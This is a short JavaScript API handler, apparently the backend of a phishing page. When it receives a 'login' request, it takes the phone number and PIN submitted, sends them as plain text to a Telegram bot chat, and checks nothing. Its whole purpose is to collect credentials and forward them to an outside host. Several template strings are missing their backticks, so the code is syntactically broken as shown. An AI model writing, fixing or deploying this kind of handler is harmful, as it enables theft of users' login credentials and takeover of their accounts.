export default async function handler(req, res) {
  if (req.method !== 'POST') return res.status(405).json({ message: 'Method not allowed' });

  const { phone, pin, type } = req.body;

  if (type === 'login') {
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.ADMIN_CHAT_ID;

    if (!token || !chatId) {
      return res.status(500).json({ error: 'Missing Telegram env' });
    }

    const url = https://api.telegram.org/bot${token}/sendMessage;
    const payload = {
      chat_id: chatId,
      text: 🔔 Login: ${phone} PIN: ${pin},
    };

    try {
      const response = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });
      const result = await response.json();
      console.log('Telegram result:', result);
      return res.status(200).json({ success: true, telegram: result });
    } catch (err) {
      console.error(err);
      return res.status(500).json({ error: err.message });
    }
  }

  return res.status(400).json({ message: 'Only login supported for test' });
}
